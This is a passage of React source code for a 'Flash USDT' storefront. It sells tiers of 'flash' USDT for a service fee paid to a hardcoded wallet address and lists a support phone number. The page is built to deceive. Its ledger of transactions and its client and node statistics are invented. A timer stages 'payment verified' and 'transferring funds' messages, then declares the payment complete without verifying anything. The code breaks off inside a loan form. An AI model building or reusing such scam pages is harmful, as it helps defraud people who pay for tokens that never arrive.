import React, { useState, useEffect, useMemo } from 'react';
import { 
  BarChart3, 
  LayoutDashboard, 
  Settings, 
  History, 
  Shield, 
  Zap, 
  Search, 
  Wallet, 
  ArrowUpRight, 
  ArrowDownLeft, 
  Copy, 
  CheckCircle2, 
  AlertCircle, 
  ExternalLink,
  ChevronRight,
  Globe,
  Lock,
  Moon,
  Bell,
  Cpu,
  RefreshCcw,
  ArrowRightLeft,
  X,
  CircleDollarSign,
  Hexagon,
  Phone
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Types & Data
type Tab = 'terminal' | 'ledger' | 'docs' | 'settings';
type Network = 'ERC20' | 'TRC20' | 'BEP20';

interface Tier {
  id: string;
  name: string;
  amount: number;
  serviceFee: number;
  apr: string;
  tag: string;
  features: string[];
}

const TIERS: Tier[] = [
  {
    id: 'starter',
    name: 'Starter Tier',
    amount: 18000,
    serviceFee: 89,
    apr: '4.2%',
    tag: 'Protocol Entry',
    features: [
      'Fast Wallet Delivery',
      '180 Days Validity',
      'VIP 24/7 Support',
      'P2P Trading Enabled',
      'Resell to Us Option',
      'Fully Transferrable'
    ],
  },
  {
    id: 'professional',
    name: 'Professional Tier',
    amount: 40000,
    serviceFee: 250,
    apr: '6.8%',
    tag: 'Institutional Access',
    features: [
      'Fast Wallet Delivery',
      '180 Days Validity',
      'VIP 24/7 Support',
      'P2P Trading Enabled',
      'Resell to Us Option',
      'Fully Transferrable'
    ],
  },
  {
    id: 'elite',
    name: 'Elite Tier',
    amount: 150000,
    serviceFee: 750,
    apr: '9.5%',
    tag: 'Governance Grade',
    features: [
      'Fast Wallet Delivery',
      '180 Days Validity',
      'VIP 24/7 Support',
      'P2P Trading Enabled',
      'Resell to Us Option',
      'Fully Transferrable'
    ],
  },
];

const MOCK_LEDGER = [
  { hash: '0x3f5...a21e', amount: '15,000', network: 'ERC20', status: 'Confirmed', time: '2m ago' },
  { hash: '0x1c8...f902', amount: '50,000', network: 'TRC20', status: 'Processing', time: '5m ago' },
  { hash: '0xa41...b761', amount: '120,000', network: 'BEP20', status: 'Confirmed', time: '12m ago' },
  { hash: '0xd92...c334', amount: '8,000', network: 'ERC20', status: 'Confirmed', time: '18m ago' },
  { hash: '0xe55...b112', amount: '60,000', network: 'TRC20', status: 'Confirmed', time: '24m ago' },
];

export default function App() {
  const [activeTab, setActiveTab] = useState<Tab>('terminal');
  const [selectedTier, setSelectedTier] = useState<Tier | null>(null);
  const [receivingNetwork, setReceivingNetwork] = useState<Network>('TRC20');
  const [isWalletConnected, setIsWalletConnected] = useState(false);
  const [isPortalOpen, setIsPortalOpen] = useState(false);
  const [isLoanModalOpen, setIsLoanModalOpen] = useState(false);
  const [loanAmount, setLoanAmount] = useState<string>('1000');
  const [loanNetwork, setLoanNetwork] = useState<Network>('TRC20');
  const [submissionStatus, setSubmissionStatus] = useState<'idle' | 'processing' | 'confirmed'>('idle');
  const [currentStep, setCurrentStep] = useState(0);
  const [isCopied, setIsCopied] = useState(false);

  const ERC20_PAYMENT_ADDRESS = '0xbf33cc5af6f07a9c6a8a8108753b73ecac19ae48';

  const [progress, setProgress] = useState(0);

  const steps = [
    'PROCESSING YOUR PAYMENT',
    'PAYMENT VERIFIED',
    'PAYMENT APPROVED',
    'TRANSFERING FUNDS TO YOUR ACCOUNT',
    'PAYMENT COMPLETE',
  ];

  const handleTierSelect = (tier: Tier) => {
    setSelectedTier(tier);
    setIsPortalOpen(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleSubmission = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmissionStatus('processing');
    setProgress(1);
    setCurrentStep(0);

    const totalDuration = 120000; // 2 minutes
    const intervalTime = 100; 
    const stepIncrement = 100 / (totalDuration / intervalTime);
    
    let currentProgress = 1;
    const timer = setInterval(() => {
      currentProgress += stepIncrement;
      if (currentProgress >= 100) {
        clearInterval(timer);
        setProgress(100);
        setSubmissionStatus('confirmed');
      } else {
        const roundedProgress = Math.min(Math.floor(currentProgress), 99);
        setProgress(roundedProgress);
        
        // Map progress to 5 steps (0-4)
        if (roundedProgress < 20) setCurrentStep(0);
        else if (roundedProgress < 40) setCurrentStep(1);
        else if (roundedProgress < 60) setCurrentStep(2);
        else if (roundedProgress < 80) setCurrentStep(3);
        else setCurrentStep(4);
      }
    }, intervalTime);
  };

  const closePortal = () => {
    setIsPortalOpen(false);
    setSubmissionStatus('idle');
    setCurrentStep(0);
  };

  const closeLoanModal = () => {
    setIsLoanModalOpen(false);
    setSubmissionStatus('idle');
    setCurrentStep(0);
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(ERC20_PAYMENT_ADDRESS);
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
  };

  return (
    <div className="flex min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-emerald-500 selection:text-black">
      {/* Sidebar Navigation */}
      <nav className="w-72 border-r border-slate-900/10 hidden lg:flex flex-col bg-slate-950 text-white sticky top-0 h-screen">
        <div className="p-8">
          <div className="flex items-center gap-3 mb-12">
            <div className="w-10 h-10 overflow-hidden rounded-xl shadow-lg border border-white/10 group flex items-center justify-center bg-slate-900">
              <img 
                src="https://i.imgur.com/176sLlt.png" 
                alt="FLASH USDT" 
                className="w-full h-full object-contain"
                referrerPolicy="no-referrer"
                onError={(e) => {
                  // Fallback to Zap icon if imgur link fails
                  e.currentTarget.style.display = 'none';
                  const parent = e.currentTarget.parentElement;
                  if (parent) {
                    parent.classList.add('bg-emerald-500');
                    parent.innerHTML = '<svg class="w-6 h-6 text-slate-950 fill-slate-950" xmlns="http://www.w3.org/2003/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>';
                  }
                }}
              />
            </div>
            <span className="text-sm font-black tracking-tight uppercase leading-tight">FLASH <span className="text-emerald-500">USDT</span><br/>SOLUTIONS</span>
          </div>

          <div className="space-y-1">
            {[
              { id: 'terminal', icon: LayoutDashboard, label: 'Liquidity Terminal' },
              { id: 'ledger', icon: History, label: 'Global Ledger' },
              { id: 'docs', icon: Shield, label: 'Protocol Docs' },
              { id: 'settings', icon: Settings, label: 'Settings' },
            ].map((item) => (
              <button
                key={item.id}
                onClick={() => setActiveTab(item.id as Tab)}
                className={`w-full flex items-center gap-4 px-4 py-3.5 rounded-xl transition-all font-bold text-sm tracking-tight ${
                  activeTab === item.id 
                    ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' 
                    : 'text-slate-400 hover:text-white hover:bg-white/5'
                }`}
              >
                <item.icon className="w-5 h-5" />
                {item.label}
              </button>
            ))}
          </div>
        </div>

        <div className="mt-auto p-8 space-y-4">
          <div className="p-5 rounded-2xl bg-white/5 border border-white/10">
            <p className="text-[10px] uppercase font-black tracking-[0.2em] text-emerald-500 mb-3">Protocol Status</p>
            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs font-bold">
                <span className="text-slate-400">Nodes Online</span>
                <span className="text-white">1,422</span>
              </div>
              <div className="flex items-center justify-between text-xs font-bold">
                <span className="text-slate-400">TPS Avg</span>
                <span className="text-white">4,281</span>
              </div>
              <div className="h-1 bg-white/10 rounded-full overflow-hidden mt-3">
                <motion.div 
                  initial={{ width: '0%' }}
                  animate={{ width: '99%' }}
                  className="h-full bg-emerald-500 shadow-[0_0_10px_#10b981]"
                />
              </div>
            </div>
          </div>
        </div>
      </nav>

      {/* Main Container */}
      <main className="flex-1 overflow-x-hidden">
        {/* Header */}
        <header className="sticky top-0 z-40 glass-morphism border-b border-slate-900/10 px-4 md:px-8 h-20 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
              <span className="text-[11px] font-black uppercase tracking-[0.2em] text-emerald-500">Network: Mainnet</span>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <button className="hidden sm:flex items-center gap-2 p-2.5 rounded-xl hover:bg-slate-900/5 text-slate-600">
               <Bell className="w-5 h-5" />
            </button>
            <button 
              onClick={() => window.open('https://metamask.io/', '_blank')}
              className={`flex items-center gap-2 px-6 py-2.5 rounded-xl font-black text-sm tracking-tight transition-all border ${
                isWalletConnected 
                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-500' 
                  : 'bg-emerald-500 text-slate-950 border-emerald-500 shadow-xl shadow-emerald-500/20 hover:scale-[1.02] active:scale-[0.98]'
              }`}
            >
              <Wallet className="w-4 h-4" />
              {isWalletConnected ? '0x3a...4f2e' : 'Connect Wallet'}
            </button>
          </div>
        </header>

        {/* Dynamic Content */}
        <div className="p-4 md:p-8 max-w-7xl mx-auto space-y-16">
          
          {activeTab === 'terminal' && (
            <motion.div 
              initial={{ opacity: 0, y: 20 }} 
              animate={{ opacity: 1, y: 0 }}
              className="space-y-16 pb-20"
            >
              <section className="space-y-6 pt-10 text-center">
                <h1 className="text-4xl md:text-6xl lg:text-7xl font-black tracking-tight leading-[1.1] max-w-4xl text-gradient mx-auto uppercase">
                  FLASH <span className="text-emerald-500">USDT</span> SOLUTION
                </h1>
                <div className="space-y-4 max-w-3xl mx-auto text-center">
                  <p className="text-emerald-500 text-sm md:text-base font-black uppercase tracking-wider">
                    Trusted Flash Coin Solutions Since 2021
                  </p>
                  <p className="text-slate-600 text-base md:text-lg font-medium leading-relaxed">
                    We provide Flash USDT and Flash Loans through major decentralized exchanges, including Uniswap, Orca, and PancakeSwap to a name fee with 24/7 phone support is available worldwide
                  </p>
                </div>
                <div className="flex flex-wrap justify-center gap-4 pt-4">
                   <button onClick={() => setIsLoanModalOpen(true)} className="px-8 py-4 bg-emerald-500 text-slate-950 border border-emerald-500 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_0_20px_rgba(16,185,129,0.3)]">
                      Get a Loan
                   </button>
                   <button onClick={() => {
                        const el = document.getElementById('tiers-section');
                        if (el) el.scrollIntoView({ behavior: 'smooth' });
                    }} className="px-8 py-4 bg-slate-950 text-white border border-slate-900/10 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-slate-900 transition-all">
                      Buy Flash
                   </button>
                </div>
              </section>

              {/* Tiers Section */}
              <section id="tiers-section" className="space-y-8">
                <div className="space-y-2">
                  <h3 className="text-2xl font-black uppercase tracking-wider">Liquidity Tiers</h3>
                  <p className="text-slate-500 text-sm">Select a provisioning tier to begin protocol initialization.</p>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                  {TIERS.map((tier) => (
                    <div 
                      key={tier.id}
                      onClick={() => handleTierSelect(tier)}
                      className="group cursor-pointer"
                    >
                      <div className="glass-card p-8 rounded-[2.5rem] border border-slate-900/10 hover:border-emerald-500/50 transition-all flex flex-col h-full relative overflow-hidden emerald-glow transform group-hover:-translate-y-2 transition-transform duration-500">
                        <div className="absolute -top-12 -right-12 w-32 h-32 bg-emerald-500/10 blur-[60px] rounded-full pointer-events-none" />
                        
                        <div className="mb-8">
                          <span className="text-[10px] font-black tracking-[0.2em] text-emerald-500 uppercase block mb-3">{tier.tag}</span>
                          <h4 className="text-2xl font-black">{tier.name}</h4>
                        </div>

                        <div className="mb-10 p-6 rounded-3xl bg-slate-950 border border-slate-900/10 text-center shadow-xl">
                          <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Received USDT</p>
                          <p className="text-3xl font-black text-white">{tier.amount.toLocaleString()}</p>
                          <p className="text-xs font-bold text-emerald-500 mt-1 uppercase tracking-tighter">FLASH USDT</p>
                        </div>

                        <div className="flex-1 space-y-6 mb-10">
                          <div className="flex items-center justify-between py-2 border-b border-slate-900/10">
                            <span className="text-slate-600 text-xs font-bold uppercase tracking-widest">Protocol yield</span>
                            <span className="text-sm font-mono font-black text-emerald-500">{tier.apr}</span>
                          </div>
                          <ul className="space-y-4">
                            {tier.features.map((f) => (
                              <li key={f} className="flex items-start gap-3">
                                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                                <span className="text-xs font-bold text-slate-600 leading-tight">{f}</span>
                              </li>
                            ))}
                          </ul>
                        </div>

                        <div className="pt-6 border-t border-slate-900/10">
                           <div className="flex items-center justify-center mb-6 text-center">
                              <div className="space-y-1">
                                <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Service Fee</p>
                                <div className="flex items-center justify-center gap-1">
                                  <span className="text-slate-600 font-bold text-lg">$</span>
                                  <span className="text-4xl font-black">{tier.serviceFee}</span>
                                </div>
                                <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">One-time payment</p>
                              </div>
                           </div>
                           <button className="w-full py-4 rounded-2xl bg-slate-950 text-white group-hover:bg-emerald-500 group-hover:text-slate-950 transition-all font-black text-xs uppercase tracking-widest flex items-center justify-center gap-2">
                             Select Tier
                             <ChevronRight className="w-4 h-4" />
                           </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </section>

              {/* Network Status Log */}
              <section className="glass-card rounded-[2.5rem] border border-slate-900/10 overflow-hidden">
                <div className="p-8 border-b border-slate-900/10 flex items-center justify-between flex-wrap gap-4">
                  <div className="space-y-1">
                    <h3 className="font-black text-lg uppercase tracking-wider flex items-center gap-3">
                       <RefreshCcw className="w-5 h-5 text-emerald-500 animate-[spin_4s_linear_infinite]" />
                       Live Network Log
                    </h3>
                    <p className="text-xs text-slate-500 font-medium tracking-tight">Real-time anonymous liquidation verification</p>
                  </div>
                  <div className="flex gap-2">
                     <div className="px-4 py-2 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-black text-emerald-500 uppercase">Latency: 8ms</div>
                     <div className="px-4 py-2 rounded-xl bg-white border border-slate-900/10 text-[10px] font-black text-slate-600 uppercase">ID: Protocol 4 v1.2</div>
                  </div>
                </div>
                <div className="overflow-x-auto">
                   <table className="w-full text-left min-w-[700px]">
                      <thead>
                        <tr className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] bg-white/[0.02]">
                          <th className="px-8 py-5">Internal Hash</th>
                          <th className="px-8 py-5">Allocation</th>
                          <th className="px-8 py-5">Bridge Path</th>
                          <th className="px-8 py-5">Validation</th>
                          <th className="px-8 py-5">Node Context</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5">
                        {MOCK_LEDGER.map((tx, i) => (
                          <tr key={i} className="hover:bg-white/[0.02] transition-colors group">
                            <td className="px-8 py-5 font-mono text-xs text-slate-600">{tx.hash}</td>
                            <td className="px-8 py-5 font-black text-sm">{tx.amount} <span className="text-[10px] text-emerald-500 font-bold tracking-widest uppercase">F-USDT</span></td>
                            <td className="px-8 py-5">
                              <span className="text-[10px] font-black px-2.5 py-1 rounded-md bg-slate-200 text-slate-300 border border-slate-900/10">{tx.network}</span>
                            </td>
                            <td className="px-8 py-5">
                              <div className="flex items-center gap-2 text-[10px] font-bold text-emerald-500">
                                <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />
                                {tx.status}
                              </div>
                            </td>
                            <td className="px-8 py-5 text-[10px] font-bold text-slate-500 uppercase tracking-widest">{tx.time}</td>
                          </tr>
                        ))}
                      </tbody>
                   </table>
                </div>
              </section>
            </motion.div>
          )}

          {activeTab === 'docs' && (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-4xl mx-auto space-y-12 py-20 pb-40">
              <h2 className="text-4xl font-black py-4 border-b border-slate-900/10 tracking-tight uppercase">Protocol <span className="text-emerald-500">Manual</span></h2>
              <div className="grid gap-12">
                {[
                  { title: '1. Liquidity Architecture', desc: 'The Flash Protocol initializes capital buffers by bridging institutional collateral pools onto public liquidity gateways. Settlements are executed within a 15-minute verification window across authenticated Ethereum, BNB, and TRON validator clusters.' },
                  { title: '2. High-Velocity Provisions', desc: 'Protocol units are issued in tier-based allocations. Each allocation carries distinct governance features and node priorities. Flash USDT is designed for immediate high-throughput P2P settlement and arbitrage liquidity.' },
                  { title: '3. Compliance Protocols', desc: 'Every transaction hash is broadcast to a network of 1,400+ validator nodes for real-time risk assessment. Large-scale provisioning is monitored by the Protocol Compliance Node (PCN) cluster to ensure total network stability.' },
                ].map((sec, i) => (
                  <div key={i} className="space-y-4">
                    <h3 className="text-lg font-black text-emerald-500 uppercase tracking-widest">{sec.title}</h3>
                    <p className="text-slate-600 text-base leading-relaxed font-medium">{sec.desc}</p>
                  </div>
                ))}
              </div>
            </motion.div>
          )}

          {/* New Footer Section */}
          <footer className="mt-20 py-20 border-t border-slate-900/10 space-y-12">
            <div className="grid md:grid-cols-2 gap-12 items-center">
              <div className="space-y-6">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-emerald-500/10 rounded-lg flex items-center justify-center border border-emerald-500/20">
                    <Bell className="w-4 h-4 text-emerald-500" />
                  </div>
                  <h4 className="text-lg font-black uppercase tracking-widest text-slate-900">Support Available</h4>
                </div>
                <p className="text-3xl font-black tracking-tight leading-tight">
                  24/7 Live Chat & Phone <br/> Support Available <span className="text-emerald-500">Worldwide.</span>
                </p>
                <div className="flex gap-4">
                  <button className="px-6 py-3 bg-emerald-500 text-slate-950 rounded-xl font-black text-xs uppercase tracking-widest hover:scale-105 transition-transform">
                    Start Live Chat
                  </button>
                  <button className="px-6 py-3 bg-slate-900/5 border border-slate-900/10 text-slate-900 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-slate-100 transition-all">
                    Contact Phone
                  </button>
                </div>
              </div>

              <div className="p-8 rounded-[2.5rem] bg-slate-950 text-white shadow-xl space-y-4">
                <p className="text-[10px] font-black text-emerald-500 uppercase tracking-[0.2em]">Company Profile</p>
                <p className="text-slate-400 text-sm leading-relaxed font-medium">
                  Trusted by clients worldwide, we provide reliable transactions, seamless delivery, and dedicated around-the-clock support to ensure a smooth experience anytime, anywhere. <span className="text-white font-bold">FLASH USDT SOLUTIONS</span>
                </p>
                <div className="pt-4 flex items-center gap-6">
                   <div className="flex flex-col">
                      <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Global Clients</span>
                      <span className="text-lg font-black text-white">45,000+</span>
                   </div>
                   <div className="w-px h-8 bg-white/10" />
                   <div className="flex flex-col">
                      <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Reliability Score</span>
                      <span className="text-lg font-black text-white">99.9%</span>
                   </div>
                </div>
              </div>
            </div>
            
            <div className="pt-12 border-t border-slate-900/10 flex flex-col md:flex-row justify-between items-center gap-4 text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">
              <p>© 2026 FLASH USDT SOLUTIONS. ALL RIGHTS RESERVED.</p>
              <div className="flex gap-8">
                 <a href="#" className="hover:text-emerald-500 transition-colors">Safety Node</a>
                 <a href="#" className="hover:text-emerald-500 transition-colors">Privacy Policy</a>
                 <a href="#" className="hover:text-emerald-500 transition-colors">Terms of Service</a>
              </div>
            </div>
          </footer>
        </div>
      </main>

      {/* Liquidity Portal Modal */}
      <AnimatePresence>
        {isPortalOpen && (
          <div className="fixed inset-0 z-[100] overflow-y-auto bg-slate-50/40 backdrop-blur-md">
            <div className="flex min-h-screen items-center justify-center p-4 md:p-8">
              <motion.div 
                initial={{ opacity: 0 }} 
                animate={{ opacity: 1 }} 
                exit={{ opacity: 0 }}
                onClick={closePortal}
                className="fixed inset-0 cursor-pointer" 
              />
              
              <motion.div
                initial={{ opacity: 0, scale: 0.95, y: 30 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 1.05, y: -30 }}
                className="relative z-10 w-full max-w-xl bg-slate-950 text-white rounded-[2rem] md:rounded-[3rem] border border-white/10 shadow-[0_45px_100px_-20px_rgba(0,0,0,0.8)] overflow-visible"
              >
                <div className="absolute top-0 left-0 w-full h-[3px] bg-gradient-to-r from-emerald-500 to-transparent rounded-t-full" />
                
                <div className="p-6 md:p-12 space-y-8">
                {submissionStatus === 'confirmed' ? (
                  <div className="text-center py-12 space-y-8">
                    <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(16,185,129,0.1)]">
                      <CheckCircle2 className="w-12 h-12 text-emerald-500" />
                    </div>
                    <div className="space-y-4">
                      <h3 className="text-3xl font-black uppercase tracking-tight text-white">Payment Complete</h3>
                      <p className="text-slate-300 text-sm max-w-xs mx-auto font-medium leading-relaxed">
                        For any issue please call <br/>
                        <a href="tel:9179609274" className="text-emerald-500 font-bold flex items-center justify-center gap-2 mt-2">
                          <Phone className="w-4 h-4" />
                          (917) 960-9274
                        </a>
                        <span className="block mt-2">Thank You!</span>
                      </p>
                    </div>
                    <button 
                      onClick={closePortal}
                      className="w-full py-5 rounded-2xl bg-emerald-500 text-slate-950 font-black shadow-2xl shadow-emerald-500/20 uppercase tracking-widest text-sm"
                    >
                      Dismiss Terminal
                    </button>
                  </div>
                ) : submissionStatus === 'processing' ? (
                  <div className="py-20 text-center space-y-12">
                    <div className="relative w-40 h-40 mx-auto">
                      <motion.div 
                        animate={{ rotate: 360 }}
                        transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                        className="absolute inset-0 border-t-[3px] border-emerald-500 rounded-full"
                      />
                      <div className="absolute inset-6 border-t-[3px] border-slate-800 rounded-full animate-pulse" />
                      <div className="absolute inset-0 flex flex-col items-center justify-center">
                        <span className="text-5xl font-black text-white">{progress}%</span>
                        <span className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-400 mt-1">Syncing</span>
                      </div>
                    </div>
                    <div className="space-y-6">
                      <AnimatePresence mode="wait">
                        <motion.p
                          key={currentStep}
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          exit={{ opacity: 0, y: -10 }}
                          className="text-2xl font-black text-white uppercase tracking-tight px-4"
                        >
                          {steps[currentStep]}
                        </motion.p>
                      </AnimatePresence>
                      <div className="flex justify-center gap-1.5">
                        {steps.map((_, i) => (
                          <div key={i} className={`h-1.5 rounded-full transition-all duration-500 ${i <= currentStep ? 'w-10 bg-emerald-500' : 'w-2 bg-white/10'}`} />
                        ))}
                      </div>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="flex items-center justify-between pb-8">
                      <div className="space-y-2">
                        <h3 className="text-3xl font-black uppercase tracking-tight text-white">Liquidity <span className="text-emerald-500">Terminal</span></h3>
                        <div className="flex items-center gap-2 text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">
                          <Cpu className="w-3 h-3 text-emerald-500" />
                          Vault ID: {selectedTier?.id.toUpperCase()} • Node: Global Relay
                        </div>
                      </div>
                      <button onClick={closePortal} className="p-2 rounded-xl hover:bg-white/10 transition-colors text-slate-400">
                        <X className="w-6 h-6" />
                      </button>
                    </div>

                    <div className="bg-slate-900 rounded-[2rem] md:rounded-[2.5rem] p-6 md:p-8 space-y-6 md:space-y-8 border border-white/10 shadow-inner">
                      <div className="flex items-center justify-between gap-4">
                        <div className="flex items-center gap-3 md:gap-4">
                           <div className="w-10 h-10 md:w-12 md:h-12 bg-slate-50 rounded-xl md:rounded-2xl flex items-center justify-center text-emerald-500 font-black border border-emerald-500/20 shadow-lg">
                             <CircleDollarSign className="w-6 h-6" />
                           </div>
                           <div>
                              <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-0.5 md:mb-1">Provision Token</p>
                              <p className="text-base md:text-lg font-black tracking-tight">USDT <span className="text-emerald-500/80 text-[10px] md:text-sm">ERC20 Protocol</span></p>
                           </div>
                        </div>
                        <div className="text-right">
                           <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-0.5 md:mb-1">Service Fee</p>
                           <p className="text-2xl md:text-3xl font-black">{selectedTier?.serviceFee}</p>
                        </div>
                      </div>

                      <div className="flex flex-col items-center gap-6 md:gap-10 py-4 md:py-6 border-y border-slate-900/10">
                        <div className="bg-white p-4 md:p-5 rounded-[1.5rem] md:rounded-[2.5rem] shadow-[0_20px_50px_-10px_rgba(0,0,0,0.6)]">
                          <img 
                            src={`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${ERC20_PAYMENT_ADDRESS}&color=020617`}
                            alt="Protocol QR"
                            className="w-40 h-40 md:w-56 md:h-56"
                          />
                        </div>
                        <div className="w-full space-y-4">
                          <div className="w-full bg-slate-950 border border-white/10 rounded-2xl p-5 flex items-center justify-between relative group shadow-2xl">
                            <code className="text-[11px] font-mono text-white break-all max-w-[80%] font-bold tracking-tight">
                              {ERC20_PAYMENT_ADDRESS}
                            </code>
                            <button 
                              onClick={copyAddress}
                              className={`p-3.5 rounded-xl transition-all hover:scale-110 active:scale-95 shadow-xl ${
                                isCopied ? 'bg-green-500 text-slate-950' : 'bg-emerald-500 text-slate-950 shadow-emerald-500/20'
                              }`}
                            >
                              {isCopied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                            </button>
                            {isCopied && (
                              <div className="absolute -top-10 right-0 bg-green-500 text-slate-950 text-[10px] font-black px-3 py-1 rounded-lg uppercase tracking-widest animate-bounce">
                                Copied to Protocol
                              </div>
                            )}
                          </div>
                          <div className="flex items-center gap-3 p-5 rounded-2xl bg-orange-500/10 border border-orange-500/20">
                            <AlertCircle className="w-5 h-5 text-orange-500 shrink-0" />
                            <p className="text-[10px] text-orange-400 font-bold leading-relaxed uppercase tracking-tight italic">
                              NOTE: Make sure to use <span className="font-black text-white px-0.5">ERC20</span> as network to avoid any delay
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <form onSubmit={handleSubmission} className="space-y-8">
                      <div className="space-y-4">
                        <div className="flex items-center justify-between text-[11px] font-black uppercase tracking-[0.2em] px-1">
                          <span className="text-slate-500">Choose a network</span>
                          <span className="text-emerald-500">Verified Path Ready</span>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          {(['TRC20', 'BEP20'] as Network[]).map((net) => (
                            <button
                              key={net}
                              type="button"
                              onClick={() => setReceivingNetwork(net)}
                              className={`py-4 rounded-2xl text-xs font-black tracking-widest transition-all border uppercase flex items-center justify-center gap-3 ${
                                receivingNetwork === net 
                                  ? 'bg-emerald-500 text-slate-950 border-emerald-500 shadow-xl shadow-emerald-500/20 scale-[1.02]' 
                                  : 'bg-slate-900/5 border-slate-900/10 text-slate-500 hover:border-white/20'
                              }`}
                            >
                              {net === 'TRC20' ? (
                                <>
                                  <div className={`w-6 h-6 rounded-lg flex items-center justify-center border ${receivingNetwork === 'TRC20' ? 'bg-slate-50/10 border-slate-950/10' : 'bg-emerald-500/10 border-emerald-500/20'}`}>
                                    <Zap className={`w-3.5 h-3.5 ${receivingNetwork === 'TRC20' ? 'text-slate-950 fill-slate-950' : 'text-emerald-500'}`} />
                                  </div>
                                  TRC 20
                                </>
                              ) : (
                                <>
                                  <div className={`w-6 h-6 rounded-lg flex items-center justify-center border ${receivingNetwork === 'BEP20' ? 'bg-slate-50/10 border-slate-950/10' : 'bg-emerald-500/10 border-emerald-500/20'}`}>
                                    <Hexagon className={`w-3.5 h-3.5 ${receivingNetwork === 'BEP20' ? 'text-slate-950 fill-slate-950' : 'text-emerald-500'}`} />
                                  </div>
                                  BEP 20
                                </>
                              )}
                            </button>
                          ))}
                        </div>
                      </div>

                      <div className="space-y-6">
                         <div className="space-y-3">
                            <label className="text-[11px] font-black text-slate-500 px-1 uppercase tracking-widest flex items-center gap-2">
                               Settlement Wallet Address <span className="text-red-500 text-lg">*</span>
                            </label>
                            <input 
                              required 
                              type="text" 
                              placeholder={`Enter destination ${receivingNetwork} vault address`}
                              className="w-full bg-white border border-slate-900/10 rounded-2xl px-6 py-4 focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 outline-none text-sm transition-all font-bold placeholder:text-slate-700" 
                            />
                         </div>
                         <div className="space-y-3">
                            <label className="text-[11px] font-black text-slate-500 px-1 uppercase tracking-widest flex items-center gap-2">
                               Confirmation Email <span className="text-red-500 text-lg">*</span>
                            </label>
                            <input 
                              required 
                              type="email" 
                              placeholder="Enter your email for confirmation receipt" 
                              className="w-full bg-slate-950 text-white border border-white/10 rounded-2xl px-6 py-4 focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 outline-none text-sm transition-all font-bold placeholder:text-slate-500" 
                            />
                         </div>
                      </div>

                      <button 
                        type="submit"
                        className="w-full py-5 rounded-[2.5rem] bg-gradient-to-r from-emerald-500 to-emerald-400 text-slate-950 font-black text-lg tracking-tight shadow-[0_20px_50px_-10px_rgba(16,185,129,0.3)] transition-all hover:scale-[1.02] active:scale-[0.98] uppercase"
                      >
                        COMPLETE THE PAYMENT
                      </button>
                    </form>
                  </>
                )}
              </div>
            </motion.div>
          </div>
        </div>
      )}
      </AnimatePresence>

      <AnimatePresence>
      {isLoanModalOpen && (
        <div className="fixed inset-0 z-[100] overflow-y-auto bg-slate-950/80 backdrop-blur-md">
          <div className="min-h-screen flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 30 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 1.05, y: -30 }}
              className="relative z-10 w-full max-w-xl bg-slate-950 text-white rounded-[2rem] md:rounded-[3rem] border border-white/10 shadow-[0_45px_100px_-20px_rgba(0,0,0,0.8)] overflow-visible"
            >
              <div className="p-8 md:p-12">
                <div className="relative pb-8 text-center">
                  <div className="space-y-2 w-full">
                    <h3 className="text-3xl font-black uppercase tracking-tight text-white">Get a <span className="text-emerald-500">Loan</span></h3>
                    <p className="text-slate-400 font-medium text-sm">Collateralized USDT loans</p>
                  </div>
                  <button onClick={closeLoanModal} className="absolute -top-4 -right-4 md:top-0 md:right-0 p-2 rounded-xl hover:bg-white/10 transition-colors text-slate-400">
                    <X className="w-6 h-6" />
                  </button>
